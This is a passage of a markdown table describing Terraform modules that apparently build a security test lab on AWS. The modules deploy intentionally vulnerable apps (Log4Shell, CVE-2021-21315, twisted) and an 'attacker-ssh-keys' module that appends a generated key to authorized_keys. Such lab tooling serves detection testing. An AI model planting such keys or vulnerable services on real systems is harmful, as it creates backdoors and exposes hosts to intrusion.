gunzip > requirements\.txt<br/><br/>    \# install java 8u131<br/>    log "checking for jdk1\.8\.0\_131\.\.\."<br/>    if \[ \! \-d /usr/java/jdk1\.8\.0\_131/ \]; then<br/>        log "jdk1\.8\.0\_131 not found \- installing\.\.\."<br/>        wget \-c \-\-header "Cookie: oraclelicense=accept\-securebackup\-cookie" http://download\.oracle\.com/otn\-pub/java/jdk/8u131\-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk\-8u131\-linux\-x64\.tar\.gz<br/>        mkdir \-p /usr/java<br/>        sudo tar \-xvzf jdk\-8u131\-linux\-x64\.tar\.gz \-C /usr/java<br/>    else<br/>        log "jdk1\.8\.0\_131 found \- skipping install"<br/>    fi<br/>    <br/><br/>    \# update java path<br/>    log "setting up java environment for build\.\.\."<br/>    export JAVA\_HOME=/usr/java/jdk1\.8\.0\_131/<br/>    sudo update\-alternatives \-\-install /usr/bin/java java $$\{JAVA\_HOME%\*/\}/bin/java 20000<br/>    sudo update\-alternatives \-\-install /usr/bin/javac javac $$\{JAVA\_HOME%\*/\}/bin/javac 20000<br/>    <br/>    java \-version >> $LOGFILE 2>&1<br/><br/>    \# download gradle 7\.3\.1<br/>    log "checking for gradle 7\.3\.1\.\.\."<br/>    if \[ \! \-d /opt/gradle/gradle\-7\.3\.1 \]; then<br/>        log "gradle not found \- installing\.\.\."<br/>        wget https://services\.gradle\.org/distributions/gradle\-7\.3\.1\-bin\.zip<br/>        mkdir /opt/gradle<br/>        unzip \-d /opt/gradle gradle\-7\.3\.1\-bin\.zip<br/>    else<br/>        log "gradle 7\.3\.1 found \- skipping install" <br/>    fi<br/><br/>    \# update gradle path<br/>    log "updating environment PATH to include gradle\.\.\."<br/>    export PATH=$PATH:/opt/gradle/gradle\-7\.3\.1/bin<br/>    gradle \-\-version >> $LOGFILE 2>&1<br/><br/>    \# clone the log4shell vulnerable app<br/>    log "cloning https://github\.com/christophetd/log4shell\-vulnerable\-app\.\.\."<br/>    git clone https://github\.com/christophetd/log4shell\-vulnerable\-app<br/>    cd log4shell\-vulnerable\-app<br/>    log "running gradle build\.\.\."<br/>    nohup gradle bootJar \-\-no\-daemon &<br/>    GRADLE\_PID=$\!<br/>    while kill \-0 $GRADLE\_PID 2> /dev/null; do<br/>        log "Process is still running\.\.\."<br/>        sleep 30<br/>    done<br/>    log "gradle build complete\."<br/>    <br/>    ls \-ltr build/libs/\*\.jar >> $LOGFILE 2>&1<br/><br/>    \# copy java jar<br/>    log "Copying java jar\.\."<br/>    cp build/libs/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar $\{local\.app\_dir\}/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar >> $LOGFILE 2>&1<br/>    <br/>    \# change to app root dir<br/>    cd $\{local\.app\_dir\}<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "starting app"<br/>        if pgrep \-f "log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar"; then<br/>            kill \-9 $\(pgrep \-f "log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar"\)<br/>        fi<br/>        screen \-S vuln\_log4j\_app\_target \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/vuln\_log4j\_app\_target\.log \-S vuln\_log4j\_app\_target \-m java \-jar $\{local\.app\_dir\}/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar \-\-server\.port=$\{var\.inputs\["listen\_port"\]\}<br/>        screen \-S vuln\_log4j\_app\_target \-X colon "logfile flush 0^M"<br/>        sleep 30<br/>        log "check app url\.\.\."<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\["listen\_port"\]\} \| tee \-a $LOGFILE; do<br/>            log "failed to connect to app url http://localhost:$\{var\.inputs\["listen\_port"\]\} \- retrying"<br/>            sleep 60<br/>        done<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = "curl unzip git"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = "curl unzip git"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    web = file\(<br/>                            "$\{path\.module\}/resources/web\.py",<br/>                        \)<br/><br/>    ldap = file\(<br/>                            "$\{path\.module\}/resources/ldap\.py",<br/>                        \)<br/>    requirements = file\(<br/>                            "$\{path\.module\}/resources/requirements\.txt",<br/>                        \)<br/>    <br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| target-vulnerable-npm-app                                                  | ./modules/ssm/deploy-npm-app                                   | ssm_deploy_npm_app                         | context.aws.ssm.vulnerable.npm_app                                        | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "npm_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8089<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-npm-app                                   | <pre>locals \{<br/>    repo = "https://github\.com/ForbiddenProgrammer/CVE\-2021\-21315\-PoC"<br/>    listen\_port=var\.inputs\["listen\_port"\]<br/>    payload = <<\-EOT<br/>    screen \-S vuln\_npm\_app\_target \-X quit<br/>    truncate \-s 0 /tmp/vuln\_npm\_app\_target\.log<br/>    log "checking for git\.\.\."<br/>    while \! command \-v git; do<br/>        log "git not found \- waiting"<br/>        sleep 10<br/>    done<br/>    log "git: $\(command \-v  git\)"<br/>    rm \-rf /vuln\_npm\_app\_target && \\<br/>    mkdir /vuln\_npm\_app\_target && \\<br/>    cd /vuln\_npm\_app\_target && \\<br/>    git clone $\{local\.repo\} && \\<br/>    cd CVE\-2021\-21315\-PoC && \\<br/>    echo $\{base64gzip\(local\.index\_js\_base64\)\} \| base64 \-d \| gunzip > index\.js<br/>    npm install >> $LOGFILE 2>&1<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "starting app"<br/>        screen \-S vuln\_npm\_app\_target \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/vuln\_npm\_app\_target\.log \-S vuln\_npm\_app\_target \-m npm start \-\-prefix /vuln\_npm\_app\_target/CVE\-2021\-21315\-PoC<br/>        screen \-S vuln\_npm\_app\_target \-X colon "logfile flush 0^M"<br/>        sleep 30<br/>        log "check app url\.\.\."<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\["listen\_port"\]\} \| tee \-a $LOGFILE; do<br/>            log "failed to connect to app url http://localhost:$\{var\.inputs\["listen\_port"\]\} \- retrying"<br/>            sleep 60<br/>        done<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = "curl nodejs npm"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = "curl nodejs npm"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    index\_js\_base64 = templatefile\(<br/>                "$\{path\.module\}/resources/index\.js",<br/>                \{<br/>                    listen\_port = var\.inputs\["listen\_port"\]<br/>                \}\)<br/>    <br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| target-vulnerable-python3-twisted-app                                      | ./modules/ssm/deploy-python3-twisted-app                       | ssm_deploy_python3_twisted_app             | context.aws.ssm.vulnerable.python3_twisted_app                            | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "python3_twisted_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8090<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-python3-twisted-app                       | <pre>locals \{<br/>    listen\_port=var\.inputs\["listen\_port"\]<br/>    payload = <<\-EOT<br/>    screen \-S vuln\_python3\_twisted\_app\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_python3\_twisted\_app\_target\.log<br/>    if command \-v $PACKAGE\_MANAGER && $PACKAGE\_MANAGER list \| grep "python3\-twisted" \| grep "18\.9\.0\-11ubuntu0\.20\.04"; then<br/>        mkdir \-p /vuln\_python3\_twisted\_app<br/>        cd /vuln\_python3\_twisted\_app<br/>        echo $\{base64gzip\(local\.app\_py\)\} \| base64 \-d \| gunzip > app\.py<br/>        echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip > requirements\.txt<br/>        log "installing requirements\.\.\."<br/>        python3 \-m pip install \-r requirements\.txt >> $LOGFILE 2>&1<br/>        log "requirements installed"<br/>        <br/>        START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>        while true; do<br/>            log "starting app"<br/>            screen \-S vuln\_python3\_twisted\_app\_target \-X quit<br/>            screen \-wipe<br/>            screen \-d \-L \-Logfile /tmp/vuln\_python3\_twisted\_app\_target\.log \-S vuln\_python3\_twisted\_app\_target \-m python3 /vuln\_python3\_twisted\_app/app\.py<br/>            screen \-S vuln\_python3\_twisted\_app\_target \-X colon "logfile flush 0^M"<br/>            sleep 30<br/>            log "check app url\.\.\."<br/>            while \! curl \-sv http://localhost:$\{var\.inputs\["listen\_port"\]\} \| tee \-a $LOGFILE; do<br/>                log "failed to connect to app url http://localhost:$\{var\.inputs\["listen\_port"\]\} \- retrying"<br/>                sleep 60<br/>            done<br/>            log 'waiting 30 minutes\.\.\.';<br/>            sleep 1800<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log "payload update detected \- exiting loop and forcing payload download"<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break<br/>            else<br/>                log "restarting loop\.\.\."<br/>            fi<br/>        done<br/>    else<br/>        log "python twisted vulnerability required the following package installed:"<br/>        log "python3\-twisted/focal\-updates,focal\-security,now 18\.9\.0\-11ubuntu0\.20\.04\.1"<br/>    fi<br/>    log "done"<br/>    EOT<br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = "curl python3\-pip"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = "curl python3\-pip"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    app\_py = templatefile\(<br/>                "$\{path\.module\}/resources/app\.py",<br/>                \{<br/>                    listen\_port = var\.inputs\["listen\_port"\]<br/>                \}\)<br/>    requirements = templatefile\(<br/>                "$\{path\.module\}/resources/requirements\.txt",<br/>                \{<br/>                \}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| target-vulnerable-rds-app                                                  | ./modules/ssm/deploy-rds-app                                   | ssm_deploy_rds_app                         | context.aws.ssm.vulnerable.rds_app                                        | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "rds_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8091<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-rds-app                                   | <pre>locals \{<br/>    listen\_port=var\.inputs\["listen\_port"\]<br/>    app\_dirname = "vuln\_rdsapp\_target"<br/>    app\_path = "/$\{local\.app\_dirname\}/app\.py"<br/>    payload = <<\-EOT<br/>    screen \-S vuln\_rdsapp\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_rdsapp\_target\.log<br/>    log "removing previous app directory"<br/>    rm \-rf /$\{local\.app\_dirname\}<br/>    log "building app directory"<br/>    mkdir \-p /$\{local\.app\_dirname\}/templates<br/>    cd /$\{local\.app\_dirname\}<br/>    <br/>    echo $\{base64gzip\(local\.app\)\} \| base64 \-d \| gunzip > app\.py<br/>    echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip > requirements\.txt<br/>    echo $\{base64gzip\(local\.test\)\} \| base64 \-d \| gunzip > test\.py<br/>    curl \-LOJ https://s3\.amazonaws\.com/rds\-downloads/rds\-combined\-ca\-bundle\.pem<br/>    echo $\{base64gzip\(local\.database\)\} \| base64 \-d \| gunzip > bootstrap\.sql<br/>    echo $\{base64gzip\(local\.entrypoint\)\} \| base64 \-d \| gunzip > entrypoint\.sh<br/>    echo $\{base64gzip\(local\.index\)\} \| base64 \-d \| gunzip > templates/index\.html<br/>    echo $\{base64gzip\(local\.cast\)\} \| base64 \-d \| gunzip > templates/cast\.html<br/><br/>    log "updating entrypoing permissions"<br/>    chmod 755 entrypoint\.sh<br/><br/>    log "installing requirements\.\.\."<br/>    python3 \-m pip install \-r requirements\.txt >> $LOGFILE 2>&1<br/>    log "requirements installed"<br/>    <br/>    log "running mysql boostrap\.\.\."<br/>    mysql \-\-ssl\-ca=rds\-combined\-ca\-bundle\.pem \-\-ssl\-mode=REQUIRED \-h $\{split\(":", var\.inputs\["db\_host"\]\)\[0\]\} \-u$\{var\.inputs\["db\_user"\]\} \-p$\{var\.inputs\["db\_password"\]\} < bootstrap\.sql<br/>    log "mysql boostrap complete"<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "starting app"<br/>        screen \-S $\{local\.app\_dirname\} \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/$\{local\.app\_dirname\}\.log \-S $\{local\.app\_dirname\} \-m /$\{local\.app\_dirname\}/entrypoint\.sh<br/>        screen \-S $\{local\.app\_dirname\} \-X colon "logfile flush 0^M"<br/>        sleep 30<br/>        log "check app url\.\.\."<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\["listen\_port"\]\}/cast \| tee \-a $LOGFILE; do<br/>            log "failed to connect to app url http://localhost:$\{var\.inputs\["listen\_port"\]\}/cast \- retrying"<br/>            sleep 60<br/>        done<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = "curl python3\-pip mysql\-client\-core\-8\.0"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = "curl python3\-pip mysql\-shell"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    app = templatefile\(<br/>                            "$\{path\.module\}/resources/app\.py\.tpl",<br/>                            \{<br/>                                region = var\.inputs\["db\_region"\]<br/>                            \}<br/>                        \)<br/>    test = templatefile\(<br/>                          "$\{path\.module\}/resources/test\.py\.tpl",<br/>                            \{<br/>                                region = var\.inputs\["db\_region"\]<br/>                            \}<br/>                        \)<br/>    requirements = templatefile\(<br/>                          "$\{path\.module\}/resources/requirements\.txt",<br/>                          \{\}<br/>                        \)<br/>    database = templatefile\(<br/>                          "$\{path\.module\}/resources/bootstrap\.sql\.tpl",<br/>                            \{<br/>                                db\_user = var\.inputs\["db\_user"\]<br/>                                db\_name = var\.inputs\["db\_name"\]<br/>                            \}<br/>                        \)<br/>    entrypoint = templatefile\(<br/>                            "$\{path\.module\}/resources/entrypoint\.sh\.tpl",<br/>                            \{<br/>                                 listen\_port = var\.inputs\["listen\_port"\]<br/>                                 app\_path = local\.app\_path<br/>                            \}<br/>                        \)<br/>    index = file\(<br/>                            "$\{path\.module\}/resources/index\.html"<br/>                        \)<br/>    cast = file\(<br/>                            "$\{path\.module\}/resources/cast\.html"<br/>                        \)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| attacker-ssh-keys                                                          | ./modules/ssm/deploy-ssh-keys                                  | ssm_deploy_secret_ssh_public               | context.aws.ssm.ssh_keys                                                  | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "ssh_keys": {<br/>                    "enabled": false,<br/>                    "ssh_authorized_keys_path": "/home/sshuser/.ssh/authorized_keys",<br/>                    "ssh_private_key_path": "/home/sshuser/.ssh/secret_key",<br/>                    "ssh_public_key_path": "/home/sshuser/.ssh/secret_key.pub"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-keys                                  | <pre>\# ssh key<br/>resource "tls\_private\_key" "ssh" \{<br/>  algorithm = "RSA"<br/>  rsa\_bits  = "4096"<br/>\}<br/><br/>locals \{<br/>    ssh\_private\_key = base64encode\(tls\_private\_key\.ssh\.private\_key\_pem\)<br/>    ssh\_private\_key\_path = var\.inputs\["ssh\_private\_key\_path"\]<br/>    ssh\_public\_key = base64encode\(chomp\(tls\_private\_key\.ssh\.public\_key\_openssh\)\)<br/>    ssh\_public\_key\_path = var\.inputs\["ssh\_public\_key\_path"\]<br/>    ssh\_authorized\_keys\_path = var\.inputs\["ssh\_authorized\_keys\_path"\]<br/>    public\_key\_user = split\("/", local\.ssh\_public\_key\_path\)\[1\] == "root" ? "root" : split\("/", local\.ssh\_public\_key\_path\)\[2\]<br/>    private\_key\_user = split\("/", local\.ssh\_private\_key\_path\)\[1\] == "root" ? "root" : split\("/", local\.ssh\_private\_key\_path\)\[2\]<br/><br/>    payload\_public = <<\-EOT<br/>    log "starting script"<br/>    log "creating public key: $\{local\.ssh\_public\_key\_path\}"<br/>    log "adding user: $\{local\.public\_key\_user\}\.\.\."<br/>    adduser \-\-gecos "" \-\-disabled\-password "$\{local\.public\_key\_user\}" \|\| log "$\{local\.public\_key\_user\} user already exists"<br/>    mkdir \-p $\{dirname\(local\.ssh\_public\_key\_path\)\}<br/>    chown \-R $\{local\.public\_key\_user\}:$\{local\.public\_key\_user\} $\{dirname\(local\.ssh\_public\_key\_path\)\}<br/>    echo '$\{base64decode\(local\.ssh\_public\_key\)\}' > $\{local\.ssh\_public\_key\_path\}<br/>    echo '$\{base64decode\(local\.ssh\_public\_key\)\}' >> $\{local\.ssh\_authorized\_keys\_path\}<br/>    sort $\{local\.ssh\_authorized\_keys\_path\} \| uniq > $\{local\.ssh\_authorized\_keys\_path\}\.uniq<br/>    mv $\{local\.ssh\_authorized\_keys\_path\}\.uniq $\{local\.ssh\_authorized\_keys\_path\}<br/>    chmod 600 $\{local\.ssh\_public\_key\_path\} $\{local\.ssh\_authorized\_keys\_path\}<br/>    chown \-R $\{local\.public\_key\_user\}:$\{local\.public\_key\_user\} $\{local\.ssh\_public\_key\_path\} $\{local\.ssh\_authorized\_keys\_path\}<br/>    log "public key: $\(ls \-l $\{local\.ssh\_public\_key\_path\}\)"<br/>    log "authorized key: $\(ls \-l $\{local\.ssh\_authorized\_keys\_path\}\)"<br/>    log "done"<br/>    EOT<br/>    base64\_payload\_public = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["public\_tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload\_public<br/>    \}\}\)<br/><br/>    payload\_private = <<\-EOT<br/>    log "starting script"<br/>    log "creating private key: $\{local\.ssh\_private\_key\_path\}"<br/>    log "adding user: $\{local\.private\_key\_user\}\.\.\."<br/>    adduser \-\-gecos "" \-\-disabled\-password "$\{local\.private\_key\_user\}" \|\| log "$\{local\.private\_key\_user\} user already exists"<br/>    mkdir \-p $\{dirname\(local\.ssh\_private\_key\_path\)\}<br/>    echo '$\{base64decode\(local\.ssh\_private\_key\)\}' > $\{local\.ssh\_private\_key\_path\}<br/>    chmod 600 $\{local\.ssh\_private\_key\_path\}<br/>    chown $\{local\.private\_key\_user\}:$\{local\.private\_key\_user\} $\{local\.ssh\_private\_key\_path\}<br/>    log "private key: $\(ls \-l $\{local\.ssh\_private\_key\_path\}\)"<br/>    log "done"<br/>    EOT<br/>    base64\_payload\_private = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["private\_tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload\_private<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload\_public = base64gzip\(local\.base64\_payload\_public\)<br/>        base64\_uncompressed\_payload\_public = base64encode\(local\.base64\_payload\_public\)<br/>        base64\_payload\_private = base64gzip\(local\.base64\_payload\_private\)<br/>        base64\_uncompressed\_payload\_private = base64encode\(local\.base64\_payload\_private\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           